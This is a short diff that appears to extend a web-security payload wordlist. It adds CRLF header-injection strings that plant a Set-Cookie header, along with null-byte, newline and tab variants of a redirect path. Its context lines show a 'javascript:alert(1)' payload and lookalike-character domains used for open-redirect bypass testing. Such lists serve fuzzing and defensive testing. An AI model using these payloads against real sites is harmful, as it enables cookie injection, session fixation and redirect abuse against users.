@@ -557,3 +557,10 @@ javascript:alert(1);
 ーlocaldomain.pw
 ｰgoogle.com
 ｰlocaldomain.pw
+/%0d%0aSet-Cookie:%20pwned=1
+/%0dSet-Cookie:%20pwned=1
+/%0aSet-Cookie:%20pwned=1
+/%00redirect
+/redirect%0a
+/redirect%0d
+/%09redirect
